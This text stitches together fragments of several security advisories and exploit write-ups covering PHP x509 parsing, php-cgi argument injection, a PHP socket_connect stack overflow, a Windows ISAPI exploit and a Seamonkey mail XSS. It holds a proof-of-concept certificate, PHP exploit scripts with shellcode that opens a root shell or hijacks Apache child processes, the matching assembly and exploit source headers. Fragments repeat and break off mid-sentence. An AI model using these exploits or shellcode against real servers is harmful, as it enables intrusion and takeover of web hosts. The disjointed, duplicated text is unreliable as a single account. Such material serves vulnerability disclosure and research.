the\r\n  string. If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n  \r\n  Because of PHP's deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable. However the actual exploit will\r\n  depend a lot on how the PHP application uses openssl_x509_parse()\r\n  and a lot of other factors.\r\n \r\n  Depending on which of the actual use cases the function is used\r\n  for by an application, an attacker can trigger the memory\r\n  corruption with a self-signed certificate. An example for this\r\n  is the public analyse.php x509 cert debugging script provided\r\n  by CACert on their webserver.\r\n  \r\n  Other applications like Wordpress use openssl_x509_parse() to\r\n  further verify SSL certificates whenever Wordpress connects to\r\n  a HTTPS URL (in case ext/curl is not loaded which is the default\r\n  for several linux distributions). Because the parsing only\r\n  happens after the initial SSL connection is established this\r\n  can only be abused by attackers controlling a malicious trusted\r\n  cert. However recent disclosures of alleged NSA capabilities,\r\n  the French incident and disclosures about fully compromised\r\n  trusted CAs in the past years have shown that this capability\r\n  might be in the reach of malicious attackers.\r\n \r\n \r\nProof of Concept:\r\n \r\n  The following x509 certificate demonstrates the out of bounds write:\r\n  \r\n  -----BEGIN CERTIFICATE-----\r\n  MIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD\r\n  VQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH\r\n  S8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91\r\n  cyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k\r\n  ZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY\r\n  ZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO\r\n  b3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT\r\n  ZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G\r\n  A1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz\r\n  dGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB\r\n  DwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu\r\n  wEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh\r\n  0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8\r\n  pkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6\r\n  SMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX\r\n  1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw\r\n  EQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF\r\n  BQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD\r\n  8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl\r\n  VArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7\r\n  lW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319\r\n  o0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg\r\n  Zsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==\r\n  -----END CERTIFICATE-----\r\n \r\n \r\nDisclosure Timeline: \r\n \r\n  01.

The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), \"%02d%02d%02d%02d%02d%02dZ\",ts->tm_year%100,\r\n        ts->tm_mon+1,ts->tm_mday,ts->tm_hour,ts->tm_min,ts->tm_sec);\r\n  */\r\n\r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n\r\n     if (timestr->length < 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, \"extension author\r\ntoo lazy to parse %s correctly\", timestr->data);\r\n        return (time_t)-1;\r\n     }\r\n\r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n\r\n     strbuf = estrdup((char *)timestr->data);\r\n\r\n     memset(&thetime, 0, sizeof(thetime));\r\n\r\n     /* we work backwards so that we can use atoi more easily */\r\n\r\n     thestr = strbuf + timestr->length - 3;\r\n\r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n\r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe.

If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n \r\n  Because of PHP's deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable.

However the actual exploit will  \ndepend a lot on how the PHP application uses openssl_x509_parse()  \nand a lot of other factors.  \n  \nDepending on which of the actual use cases the function is used  \nfor by an application, an attacker can trigger the memory  \ncorruption with a self-signed certificate. An example for this  \nis the public analyse.php x509 cert debugging script provided  \nby CACert on their webserver.  \n  \nOther applications like Wordpress use openssl_x509_parse() to  \nfurther verify SSL certificates whenever Wordpress connects to  \na HTTPS URL (in case ext/curl is not loaded which is the default  \nfor several linux distributions). Because the parsing only  \nhappens after the initial SSL connection is established this  \ncan only be abused by attackers controlling a malicious trusted  \ncert. However recent disclosures of alleged NSA capabilities,  \nthe French incident and disclosures about fully compromised  \ntrusted CAs in the past years have shown that this capability  \nmight be in the reach of malicious attackers.  \n  \n  \nProof of Concept:  \n  \nThe following x509 certificate demonstrates the out of bounds write:  \n  \n-----BEGIN CERTIFICATE-----  \nMIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD  \nVQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH  \nS8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91  \ncyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k  \nZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY  \nZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  \nAAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO  \nb3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT  \nZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G  \nA1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz  \ndGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB  \nDwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu  \nwEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh  \n0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8  \npkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6  \nSMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX  \n1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw  \nEQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF  \nBQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD  \n8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl  \nVArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7  \nlW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319  \no0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg  \nZsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==  \n-----END CERTIFICATE-----  \n  \n  \nDisclosure Timeline:   \n  \n01.

When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with

While the first POC was literally just a  \ntrivial POC - the second one was written for self-educational purposes (we  \nleared quite a lot which is the most important thing) and we hope it might  \nbe useful for some other vulnerabilities of this/similar type.  \n  \nThis is an old fashioned stack buffer overflow in the socket module,  \nproblem occurs in the socket_connect. It uses memcpy to copy path from addr  \nto s_un without checking addr length in case when AF_UNIX socket is used.   \n  \nPOC popping a shell:  \n-- cut --  \n<?php  \necho \"[+] CVE-2011-1938\";  \necho \"[+] there we go...\\n\";  \ndefine('EVIL_SPACE_ADDR', \"\\xff\\xff\\xee\\xb3\");  \ndefine('EVIL_SPACE_SIZE', 1024*1024*8);  \n$SHELLCODE =   \n\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\".  \n\"\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\".  \n\"\\xcd\\x80\";  \necho \"[+] creating the sled.\\n\";  \n  \n$CODE = str_repeat(\"\\x90\", EVIL_SPACE_SIZE);  \nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;  \n$i < strlen($SHELLCODE) ; $i++, $j++) {  \n$CODE[$j] = $SHELLCODE[$i];  \n}  \n  \n$b = str_repeat(\"A\", 196).EVIL_SPACE_ADDR;  \n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);  \necho \"[+] popping shell, have fun (if you picked the right address...)\\n\";  \n$var85 = socket_connect($var79,$b);  \n?>  \n-- cut --  \n  \n  \n  \nTesting POC :  \n-- cut --  \ntest@Vdft02:/home/n1x0n# php ./kaka4.php   \n[+] there we go...  \n[+] creating the sled.  \n[+] popping shell, have fun.  \nPHP Warning: socket_connect(): unable to connect [22]: Invalid argument in   \n/home/n1x0n/kaka4.php on line 16  \nbash-4.1#   \n-- cut --  \n  \n  \nNow, popping a shell from a .php file that we just uploaded is quite lame  \nand boring isn't (yes you can use remote connect back with RFI etc..) it ?  \nInstead we decided to create a shellcode that will do something less common  \nand more appropriate to this particular type of vulnerability. As we pretty  \nmuch have a _full_ control over the apache child process and it's memory -  \nwe can do whatever we like with it. So one of the things that we considered  \nto be quite nifty was forcing apache child process to serve a page of our  \nchoice. Few problems appeared at this point : how apache handles  \nconnections, how to cleanly get back to apache from our shellcode, how to  \nkeep our handler in memory and respond to requests etc etc... and after few  \nlong nights of playing with this we managed to create a shellcode that  \nsimply \"infects\" the apache child process that handled connection to our  \n\"magic\" php script, and all new requests that will be handled by this child  \nwill return a page of our choice. We decided to create a simple apache  \nmodule, and use apache's built in functionality to generate  \ncontent(av_rputs), then to use mmap2 to keep our code in memory when our  \nshellcode leaves. Next step is to overwrite _hooks in apache and exit in a  \nneat way by signalling the process with SIGPROF thanks to which the signal  \nhandler cleans everything up behind us. So the main idea is to \"infect\"  \napache child process with our own code. If we do this several times - we  \ncan infect _all_ apache child processes effectively hijacking _all_  \nrequests comming into apache.  \n  \nThis is the result (obviously you need to guess/find few addresses due to  \nASLR like av_rputs & _handle ). Other protections will prevent this from  \nworking (like SSP,PIE and such).  \n  \n  \nBEFORE (everything works as expected):  \n-- cut --  \ntest@Vdft02:~# curl localhost  \n<html><body><h1>It works!</h1></body></html>  \ntest@Vdft02:~# curl http://localhost/this_does_not_exist  \n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">  \n<html><head>  \n<title>404 Not Found</title>  \n</head><body>  \n<h1>Not Found</h1>  \n<p>The requested URL /this_does_not_exist was not found on this server.</p>  \n</body></html>  \n-- cut --  \n  \nThen we call our magic file few times, you'll see the SIGPERF signal sent  \nby a shellcode (this is a good sign ;-P ) :  \n  \n-- cut --  \ntest@Vdft02:~# curl http://localhost/cz.php  \n<br />  \n<b>Warning</b>: socket_connect() [<a  \nhref='function.socket-connect'>function.socket-connect</a>]: unable to  \nconnect [9]: Bad file descriptor in <b>/test/apacz/a/htdocs/cz.php</b>   \non line <b>31</b><br />  \n<br />  \n<b>Fatal error</b>: Maximum execution time of 30 seconds exceeded in  \n<b>/test/apacz/a/htdocs/cz.php</b> on line <b>31</b><br />  \n-- cut --  \n  \n  \nThis has to be done several times so that we inject code to all child pids  \n(not going to add more spam here with all these requests) :  \n  \nfor i in $(seq 1 512) ; do curl http://localhost/cz.php ; done   \n  \n  \nAFTER:   \n-- cut --  \ntest@Vdft02:~# curl http://localhost/  \npwned  \ntest@Vdft02:~# curl http://localhost/does_not_exist  \npwned  \ntest@Vdft02:~# curl http://localhost/does_not_exist.php  \npwned  \ntest@Vdft02:~# curl http://localhost/does_not_exist.jpg   \npwned  \n-- cut --  \n  \n  \n  \n  \n  \nAnd this is the code with the infecting shellcode.  \n-- cut --  \n<?php  \n  \ndefine('EVIL_SPACE_ADDR', \"\\x00\\x00\\xff\\xb5\");  \ndefine('EVIL_SPACE_SIZE', 1024*1024*16);  \n$SHELLCODE =  \n\"\\x31\\xc9\\x31\\xd2\\x31\\xdb\\x66\\xb9\\x00\\x02\\x66\\xba\\x07\\x00\\xbe\\x22\".  \n\"\\x00\\x00\\x00\\xbf\\xff\\xff\\xff\\xff\\x31\\xed\\xb8\\xc0\\x00\\x00\\x00\\xcd\".  \n\"\\x80\\x89\\xc7\\x89\\xc3\\xeb\\x2d\\x5e\\xb9\\x00\\x02\\x00\\x00\\xf3\\xa4\\xb8\".  \n\"\\xc0\\xc2\\x0c\\x08\\x8b\\x40\\x14\\x8b\\x40\\x10\\x89\\x18\\x31\\xc0\\x31\\xdb\".  \n\"\\x31\\xc9\\x66\\xb8\\x14\\x00\\xcd\\x80\\x89\\xc3\\x66\\xb9\\x1b\\x00\\x66\\xb8\".  \n\"\\x25\\x00\\xcd\\x80\\xe8\\xce\\xff\\xff\\xff\\x55\\x89\\xe5\\x8b\\x5d\\x08\\x53\".  \n\"\\xeb\\x0e\\xb8\\x43\\xd3\\x06\\x08\\xff\\xd0\\x83\\xc4\\x08\\x31\\xc0\\xc9\\xc3\".  \n\"\\xe8\\xed\\xff\\xff\\xff\\x70\\x77\\x6e\\x65\\x64\\x0a\\x00\";  \n  \n/* allocate memory for shellcode */  \n$CODE = str_repeat(\"\\x90\", EVIL_SPACE_SIZE);  \nfor ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ; $i <  \nstrlen($SHELLCODE) ; $i++, $j++) {  \n$CODE[$j] = $SHELLCODE[$i];  \n}  \n  \n$b = str_repeat(EVIL_SPACE_ADDR,46);  \n  \n$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);  \n$var85 = socket_connect($var79,$b);  \n  \n?>  \n-- cut --  \n  \n  \nand above shellcode in a human readable form would be something along these  \nlines:  \n  \n  \n-- cut --  \nsection .text  \n  \n_start:  \n  \nxor ecx, ecx  \nxor edx, edx  \nxor ebx, ebx ; NULL  \nmov cx,0x200 ; 512 bytes   \nmov dx,0x7 ; PROT_READ|PROT_WRITE|PROT_EXEC  \nmov esi,0x22 ; MAP_PRIVATE|MAP_ANONYMOUS  \nmov edi,0xffffffff ; -1  \nxor ebp, ebp ;  \nmov eax,0xc0 ; mmap()  \nint 80h  \nmov edi, eax  \nmov ebx, eax  \njmp short handler  \nnext_3:  \npop esi  \nmov ecx, 0x200  \nrep movsb  \nmov eax, 0x80cc2c0  \nmov eax, [eax+0x14]  \nmov eax, [eax+0x10]  \nmov [eax], ebx  \n; kill(getpid(), SIGPROF)  \nxor eax, eax  \nxor ebx, ebx  \nxor ecx, ecx  \nmov ax, 20 ; getpid()  \nint 80h  \nmov ebx, eax ; pid  \nmov cx, 27 ; SIGPROF  \nmov ax, 37 ; kill()  \nint 80h  \n; not reached  \n  \nhandler:  \ncall near next_3  \npush ebp  \nmov ebp, esp  \nmov ebx, [ebp+8]  \npush ebx  \njmp short pwned  \nnext_2:  \nmov eax, 0xb4dc0d3d  \ncall eax  \nadd esp, 8  \nxor eax, eax  \nleave  \nret  \n  \npwned:  \ncall near next_2  \ndb \"pwned\",10,0  \n-- cut --  \n  \n  \nFound and exploited by:  \nMateusz (shm) Kocielski, Filip (s1m0n) Palian and Marek (n1x0n) Kroemeke  \n  \nBest regards,  \nMarek  \n  \n`\n",

At worst, if DEP is enabled for the Apache process, you could cause \r\n * a constant DoS by looping this (since apache will automatically restart) :)\r\n *\r\n * Note that the exploit code may need to be run multiple times before a shell is spawned (70%\r\n * success rate - tested on three different systems). Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms. This is due to loaded memory \r\n * references to the unloaded DLL (they will be different for each ISAPI module). Do not test\r\n * this code in a VM otherwise the code may fail to send the RESET packet (something to do with\r\n * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want\r\n * to have to use raw packets on Windows. \r\n *\r\n * Shellcode Note: \r\n * The shellcode writes &quot;pwn-isapi&quot; to &quot;sos.txt&quot; which is created in the current working directory. \r\n * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding\r\n * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base \r\n * address of msvcrt.dll instead. I've also added another check so that it will be able to detect\r\n * &quot;msvcrt.dll&quot; on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this\r\n * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of \r\n * msvcrt.dll. So the added check will verify the presents of &quot;m&quot; before proceeding. \r\n *\r\n * Author: \r\n * Brett Gervasoni (brettg [at] senseofsecurity.com.au)\r\n *\r\n * Copyright Sense of Security Pty Ltd 2010. \r\n * http://www.senseofsecurity.com.au\r\n */\r\n\r\n#include &lt;iostream&gt;\r\n#include &lt;windows.h&gt;\r\n#include &lt;winsock.h&gt;\r\n#include &lt;string&gt;\r\n#include &lt;direct.h&gt;\r\n\r\n#pragma comment(lib, &quot;wsock32.lib&quot;)\r\n\r\nusing namespace std;\r\n\r\n#define SERVER_PORT 80\r\n\r\nvoid header();\r\nint createConnection(string targetAddr, int targetPort);\r\nint sendTransmission(string message);\r\nstring recvTransmission();\r\nvoid cleanUp();\r\n\r\nWORD sockVersion;\r\nWSADATA wsaData;\r\n\r\nint sock;\r\nstruct sockaddr_in rserver;\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n\tstring serverIP, isapiDLL;\r\n\tstring triggerVuln, payload;\r\n\tchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];\r\n\r\n\t//custom shellcode that writes &quot;pwn-isapi&quot; to &quot;sos.txt&quot; in the current working directory\r\n\t//Note: There are four NOPs at the end for padding.

At worst, if DEP is enabled for the Apache process, you could cause \r\n * a constant DoS by looping this (since apache will automatically restart) :)\r\n *\r\n * Note that the exploit code may need to be run multiple times before a shell is spawned (70%\r\n * success rate - tested on three different systems). Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms. This is due to loaded memory \r\n * references to the unloaded DLL (they will be different for each ISAPI module).

Furthermore, the exploit code may require \r\n * modification to exploit this vulnerability on different platforms.

At worst, if DEP is enabled for the Apache process, you could cause   \n* a constant DoS by looping this (since apache will automatically restart) :)  \n*  \n* Note that the exploit code may need to be run multiple times before a shell is spawned (70%  \n* success rate - tested on three different systems). Furthermore, the exploit code may require   \n* modification to exploit this vulnerability on different platforms. This is due to loaded memory   \n* references to the unloaded DLL (they will be different for each ISAPI module). Do not test  \n* this code in a VM otherwise the code may fail to send the RESET packet (something to do with  \n* VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want  \n* to have to use raw packets on Windows.   \n*  \n* Shellcode Note:   \n* The shellcode writes \"pwn-isapi\" to \"sos.txt\" which is created in the current working directory.   \n* Most operating systems should be supported by this shellcode. I've used Skylined's method of finding  \n* the base address of kernel32.dll for Windows 7 and modified it so that it will find the base   \n* address of msvcrt.dll instead. I've also added another check so that it will be able to detect  \n* \"msvcrt.dll\" on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this  \n* DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of   \n* msvcrt.dll. So the added check will verify the presents of \"m\" before proceeding.   \n*  \n* Author:   \n* Brett Gervasoni (brettg [at] senseofsecurity.com.au)  \n*  \n* Copyright Sense of Security Pty Ltd 2010.   \n* http://www.senseofsecurity.com.au  \n*/  \n  \n#include <iostream>  \n#include <windows.h>  \n#include <winsock.h>  \n#include <string>  \n#include <direct.h>  \n  \n#pragma comment(lib, \"wsock32.lib\")  \n  \nusing namespace std;  \n  \n#define SERVER_PORT 80  \n  \nvoid header();  \nint createConnection(string targetAddr, int targetPort);  \nint sendTransmission(string message);  \nstring recvTransmission();  \nvoid cleanUp();  \n  \nWORD sockVersion;  \nWSADATA wsaData;  \n  \nint sock;  \nstruct sockaddr_in rserver;  \n  \nint main(int argc, char *argv[])  \n{  \nstring serverIP, isapiDLL;  \nstring triggerVuln, payload;  \nchar accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];  \n  \n//custom shellcode that writes \"pwn-isapi\" to \"sos.txt\" in the current working directory  \n//Note: There are four NOPs at the end for padding.

It is the continuation of the former Mozilla Application Suite, \r\nbased on the same source code. The development of SeaMonkey is community-driven, in contrast to the Mozilla Application Suite, which \r\nuntil its last released version (1.7.13) was governed by the Mozilla Foundation. The new project-leading group is the SeaMonkey Council.\r\n\r\nSeaMonkey consists of a web browser (SeaMonkey Navigator), which is a descendant of the Netscape family, an e-mail and news client \r\nprogram (SeaMonkey Mail & Newsgroups, which shares code with Mozilla Thunderbird), an HTML editor (SeaMonkey Composer) and an IRC \r\nclient (ChatZilla). The software suite supports skins. It comes with two skins in the default installation, Modern and Classic.\r\n\r\nMail\r\nMail features includes support for multiple accounts {the documentation does not state how many}, junk mail detection, message filters, \r\nHTML message support, a dictionary, an address book, customizable labels, add-ons and mail views as well as integration with the rest of suite.\r\n\r\nComposer\r\nSeaMonkey Composer 2.16 running on Ubuntu 12.04. SeaMonkey Composer is a WYSIWYG HTML editor. Its main user interface features four tabs: \r\nNormal (WYSIWYG), HTML tags, HTML code, and browser preview. The generated code is HTML 4.01 Transitional. As of version 1.1.13, \r\nSeaMonkey Composer supports basic text formatting and styling, insertion of hyperlinks and images, and the creation of tables. It does \r\nnot support the addition of form elements (text fields, check boxes, and buttons). SeaMonkey Composer is scheduled to be updated with the \r\nrelease of KompoZer 0.8 which is currently under development.\r\n\r\n\r\nVendor Homepage: \thttp://www.mozilla.org\r\nProduct website: \thttp://www.seamonkey-project.org/releases/seamonkey2.17/\r\n\r\n\r\nAbstract Advisory Information:\r\n==============================\r\nThe Vulnerability Laboratory Research Team discovered a filter bypass and persistent validation web vulnerability in the Mozilla Seamonkey application.\r\n\r\n\r\nVulnerability Disclosure Timeline:\r\n==================================\r\n2013-05-10: Researcher Notification & Coordination (Ateeq ur Rehman Khan)\r\n2013-05-11: Vendor Notification (Mozilla Security Incident Team)\r\n2013-05-21: Vendor Response/Feedback (Mozilla Security Incident Team)\r\n2014-01-18: Vendor Fix/Patch (Mozilla Developer Team - Reward 1.500$ SWB)\r\n2014-01-27: Public Disclosure (Vulnerability Laboratory)\r\n\r\n\r\nDiscovery Status:\r\n=================\r\nPublished\r\n\r\n\r\nAffected Product(s):\r\n====================\r\nMozilla\r\nProduct: Seamonkey 2.17.1\r\n\r\n\r\nExploitation Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity Level:\r\n===============\r\nHigh\r\n\r\n\r\nTechnical Details & Description:\r\n================================\r\nSince Seamonkey is using Mozilla Thunderbird at the backend for its mail client, It is prone to the same Persistent vulnerability \r\nthat i had reported earlier to Mozilla Security Team. \r\n\r\nI will include the details again in this advisory for your reference and ease. \r\n\r\nBasically , attaching a debugger with the seamonkey binary file, it was initially noticed that malicious java-script tags were being \r\nfiltered / blocked. By default, HTML tags like <script> and <iframe> are blocked in Seamonkey and get filtered immediately upon \r\ninsertion however, While drafting a new email message, attackers can easily bypass the current input filters by encoding their \r\npayloads with base64 encryption and using the <object> tag and insert malicious scripts / code eg. (script / frame) within the \r\nemails and send it to the victims. The exploit gets triggered once the victim decides to reply back and clicks on the `Reply` or `Forward` Buttons.\r\n\r\nAfter successfully bypassing the input filters, an attacker can inject persistent script code while writing a new email and send \r\nit to victims. Interestingly the payload gets filtered during the initial viewing mode however if the victim clicks on Reply or \r\nForward, the exploit gets executed successfully. For a POC i will be including multiple examples in this advisory for your review. \r\nI was able to run multiple scripts generating strange behaviour on the application which can be seen in the debugging errors \r\nwhich I have attached along with this report.\r\n\r\nThese sort of vulnerabilities can result in multiple attack vectors on the client end which may eventually result in complete \r\ncompromise of the end user system. The persistent code injection vulnerability is located within the main application. Exploitation \r\nof this persistent application vulnerability requires a low or medium user interaction. Successful exploitation of the vulnerability \r\nmay result in malicious script code being executed in the victims browser resulting in script code injection, persistent phishing, \r\nClient side redirects and similar client side attacks.\r\n\r\n\r\nVulnerable Service(s):\r\n[+] Seamonkey 2.17.1 - Latest Release \r\n\r\n\r\nVulnerable Section(s):\r\n[+] Compose (Compose in HTML)\r\n[+] Email Signature (Mail & Newsgroups Account Settings)\r\n[+] Attach File with Signature as HTML (Mail & Newsgroups Account Settings)\r\n\r\n\r\nProof of Concept (PoC):\r\n=======================\r\nThe validation and filter bypass vulnerability can be exploited by remote attackers without privileged application user account \r\nand direct user interaction. To demonstrate or reproduce the vulnerability follow the provided steps and information below.\r\n\r\nProof of Concept #1\r\n\r\na) Create a new email message (Compose in HTML)\r\nb) In the body text, insert new HTML tag with the POC \"Payload\"\r\nc) Send the email to the victim (your test email account)\r\nd) Open the new email in the victim browser and click Reply\r\ne) You should now see a 